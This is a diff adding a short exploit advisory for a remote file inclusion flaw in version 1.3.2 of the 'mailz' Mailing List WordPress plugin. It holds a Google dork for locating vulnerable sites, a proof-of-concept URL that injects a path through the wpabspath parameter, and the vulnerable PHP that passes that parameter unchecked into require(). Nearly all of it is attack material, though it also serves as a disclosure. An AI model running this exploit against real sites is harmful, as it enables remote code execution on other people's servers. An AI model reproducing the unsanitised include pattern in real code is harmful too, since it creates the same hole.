@@ -1,0 +1,21 @@
+# Exploit Title: Mailing List Wordpress plugin RFI
+# Google Dork: inurl:wp-content/plugins/mailz
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/mailz/download/
+# Version: 1.3.2 (tested)
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/mailz/lists/config/config.php?wpabspath=RFI
+
+---
+Vulnerable Code
+---
+if ( isset($_GET['wpabspath']) ) {
+	//zingiri
+	//error_reporting(E_ALL & ~E_NOTICE);
+	//ini_set('display_errors', '1');
+	define('ABSPATH', dirname(__FILE__) . '/');
+	require($_GET['wpabspath'].'wp-config.php');
